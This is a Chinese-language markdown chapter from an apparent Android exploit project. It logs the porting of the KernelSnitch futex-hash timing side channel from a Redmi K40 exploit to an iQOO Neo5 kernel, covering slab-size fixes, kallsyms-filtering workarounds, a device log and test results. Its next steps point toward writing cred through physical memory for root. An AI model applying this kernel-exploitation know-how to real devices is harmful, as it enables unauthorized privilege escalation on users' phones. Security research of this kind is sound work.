# 07 - KernelSnitch 移植 / KernelSnitch Porting

> **后续真机验证**：独立普通 futex 实验已在正确线性映射范围内取得两轮一致的唯一候选，详见[最新报告与原始日志](../analysis/reports/device_validation_20261109.md)。下文保留前一阶段的移植记录，其中“尚未重测”的状态已由该报告更新；完整提权链仍未成功。

> **文档状态**: ✅ 已完成  
> **最后更新**: 2026-11-09  
> **作者**: Viper-Boss

---

## 概述

本章节记录 KernelSnitch 技术从红米 K40（上游 GhostLock exploit）移植到 iQOO Neo5（PD2055）的过程，包括：

- 遇到的内核差异
- 数据结构问题（futex_key、mm_struct）
- slab 参数修复
- 静态验证结果
- 尚未验证的假设

**当前状态**: 用户态 futex 哈希已与 vivo 目标内核**逐位一致**（反汇编验证），但设备端尚未成功定位 mm_struct。

---

## KernelSnitch 工作原理

### 三个阶段

```
阶段 1: 碰撞发现（时序侧信道）
  创建多个用户态 futex（不同地址）
  在某地址上堆 13000+ 等待者
  测量其他地址上的 FUTEX_WAKE 延迟
  → 延迟显著增加 = 哈希到同一 bucket

阶段 2: 暴力反推（用户态计算）
  遍历所有可能的 mm_struct 地址（identity map 区间）
  对每个候选 mm，计算 futex_hash(addr, candidate)
  如果所有碰撞地址都哈希到同一 bucket → 找到真实 mm

阶段 3: 利用（不在本移植范围）
  用 mm 地址进一步定位 init_task → cred → 提权
```

### 关键前提

阶段 2 要求用户态 futex 哈希与内核**逐位一致**。否则：
- 阶段 1（时序）仍然工作（测量真实内核）
- 阶段 2（计算）会失败（错误的哈希 → 找不到/找错 mm）

---

## 移植过程中遇到的问题

### 问题 1: futex_key 字段顺序（已解决）

**问题**: 上游 K40 exploit 的 typedef 与上游 v4.19 反了，但与 vivo 一致！

**详情**: 见 `docs/06_futex_hash_research.md`（三次判断，最终反汇编定论）。

**解决**: typedef 保持 mm@0/address@8（与 vivo 一致），加 `_Static_assert` 钉死。

### 问题 2: MM_STRUCT_SZ（已解决）

**问题**: K40 默认 0x340（832 字节），但 PD2055 实际是 **0x3C0（960 字节）**。

**验证方法**:
```bash
adb shell "cat /proc/slabinfo | grep mm_struct"
# 输出: mm_struct  1719  2006  960  34  8 ...
#                 ^active ^num ^objsize ^objs/slab ^pages/slab
```

**影响**: 
- 错误值 0x340：`32768 / 832 = 39` obj/slab（错误）
- 正确值 0x3C0：`32768 / 960 = 34` obj/slab（与 slabinfo 吻合）

**修复**: `target.h` 中 `#define MM_STRUCT_SZ 0x3C0`

### 问题 3: mm_slab_order 重置 bug（已解决）

**问题**: `util.c` 的重试逻辑把 `mm_slab_order` 重置为 0，但设备实际是 order 3。

**修复**:
```c
// 修复前
ks->mm_slab_order = 0;  // 错误

// 修复后  
ks->mm_slab_order = MM_ORDER;  // 3（从 slabinfo 验证）
```

### 问题 4: vivo 符号过滤（已绕过）

**问题**: `init_task`、`commit_creds` 等被从 kallsyms 中删除。

**对策**:
- `init_task` → 用 `__start_init_task`（段起始，未过滤）
- `commit_creds` → 不调用，直接物理内存写 cred

### 问题 5: 健全性门控（新增）

**新增**: `futex_hash_mm_dependent()` 探针 + `kernelsnitch_bruteforce()` 前置检查。

**逻辑**: 如果哈希不依赖 mm（布局回归或内核改了哈希），拒绝运行暴力反推，避免返回假阳性地址。

```c
if (!ks->hash_mm_dependent) {
    pr_warning("KernelSnitch: futex hash is mm-INDEPENDENT on this build.\n");
    pr_warning("mm localization cannot work; refusing to report a candidate.\n");
    ks->mm_struct = (size_t)-1;
    return;
}
```

### 问题 6: 状态字符串数组缺项（已修复）

**问题**: 枚举 6 个状态，字符串数组只有 5 项，索引 3 起全部错位。

**修复**: 指定索引初始化（designated initializers），按名字绑定而非按位置：

```c
char *const kernelsnitch_strings[KERNELSNITCH_LAST] = {
    [KERNELSNITCH_NOT_INIT]             = "not initialized",
    [KERNELSNITCH_INIT]                 = "initialized",
    [KERNELSNITCH_COLLISIONS_FOUND]     = "collisions found",
    [KERNELSNITCH_COLLISIONS_NOT_FOUND] = "collisions NOT found",
    [KERNELSNITCH_MM_FOUND]             = "mm_struct found",
    [KERNELSNITCH_MM_NOT_FOUND]         = "mm_struct not found",
};
```

---

## 设备端运行日志（历史，修复前）

```
[+] preload starting pid=25073
[+] startup context uid=2000 euid=2000 attr=u:r:shell:s0 enforce=1
[*] memory detected ram=0x300000000 (12 GB)
[*] futex_init hashsize=0x800 (cpus=8)
[*] found 3 collisions              ← 阶段1成功！
[*] [  0] start finding mm_struct [ffffff8000000000-ffffff8080000000]
...
[-] KernelSnitch mm_struct leak failed    ← 阶段2失败
[-] prepare_kernel_page retry 1/12
... (重试 12 次，全部失败)
```

**分析**:
- 阶段 1（碰撞发现）成功 → 时序侧信道工作正常
- 阶段 2（暴力反推）失败 → 以下参数当时是错的：
  1. `MM_STRUCT_SZ = 0x340`（应为 0x3C0）
  2. `mm_slab_order` 重置为 0（应为 3）
  3. futex_key 布局（当时的分析混乱，但 K40 原始 typedef 实际上是对的）

**当前状态**: 上述 1、2 已修复，3 已确认正确。**尚未用修复版在真机重测**。

---

## 静态验证结果

### 单元测试

```bash
cd exploit && make test
# 16/16 PASS
#  - futex_key_t layout == disassembled target (mm@0/addr@8)
#  - full hash matches disassembly reference (7/7)
#  - hash differs for different mm (mm IS hashed)
#  - target [mm,addr] differs from upstream [addr,mm]
#  - state mapping 6/6 correct
#  - slab arithmetic (0x3C0 → 34 obj/slab)
```

### 反汇编验证

```bash
python3 scripts/disasm_futex.py --from-boot boot.img --kallsyms kallsyms.txt --scan-hash
# get_task_mm: task_struct.mm @ 0x580 ✓
# get_futex_key: mm@0, address@8 ✓
# 12 seed sites: all 0xdeadbeff (length 4) ✓
# futex_init: roundup_pow_of_two(256*cpus) ✓
```

---

## 尚未验证的假设

| 假设 | 状态 | 验证方法 |
|------|------|---------|
| futex 哈希与 vivo 内核一致 | ✅ 已验证（反汇编+单测） | `disasm_futex.py` |
| MM_STRUCT_SZ = 0x3C0 | ✅ 已验证（slabinfo） | `adb shell cat /proc/slabinfo` |
| mm_slab_order = 3 | ✅ 已验证（slabinfo） | 同上 |
| KIMAGE_TEXT_BASE | ❌ 未验证（需运行时） | KASLR slide 泄露 |
| cred/pipe 结构体偏移 | ⚠️ 部分验证（K40 同族，未逐项反汇编） | 提取 kheaders |
| KernelSnitch 定位成功 | ❌ **未验证**（设备端未重测） | 运行修复版 |

---

## 下一步

1. **设备端重测**（需用户授权）：运行修复版 exploit，观察 mm 定位是否成功
2. **验证 KIMAGE_TEXT_BASE**：通过 slide 泄露或 boot_id 侧信道
3. **验证结构体偏移**：提取 kheaders（CONFIG_IKHEADERS=y）
4. **替代路径**：如果 KernelSnitch 仍失败，考虑 CHEESE_BASE_HUNT 或直接 pipe physrw

---

## 参考

- exploit 源码: `exploit/src/kernelsnitch/`
- 单元测试: `exploit/tests/test_futex_hash.c`
- 反汇编报告: `analysis/reports/futex_disassembly_report.md`
- futex 研究: `docs/06_futex_hash_research.md`
- slabinfo: `analysis/evidence/slabinfo_PD2055.txt`
- 失败尝试: `FAILED_ATTEMPTS.md`
